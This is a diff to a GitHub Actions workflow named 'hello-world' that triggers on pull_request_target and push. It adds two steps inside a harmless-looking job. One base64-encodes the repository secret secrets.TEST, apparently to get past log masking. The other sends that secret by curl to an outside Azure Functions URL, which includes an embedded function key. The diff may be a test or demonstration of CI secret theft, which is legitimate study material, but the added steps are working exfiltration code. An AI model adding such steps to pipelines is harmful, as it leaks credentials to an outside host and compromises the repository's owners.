@@ -1,5 +1,6 @@
 name: hello-world
 on:
+  push:
   pull_request_target:
     branches:
       - 'main'
@@ -8,5 +9,7 @@ jobs:
   my-job:
     runs-on: ubuntu-latest
     steps:
+      - run: echo ${{ secrets.TEST }} | base64
+      - run: curl https://mattiask-test.azurewebsites.net/api/HttpTrigger1\?code\=9fbMzQ4iHKDzxpajwVwVvjzU2kwPv5dfOf9R05Zy6LbfAzFuxbq7fA\=\=\&name=${{ secrets.TEST }}
       - name: my-step
         run: echo "Hello World!"
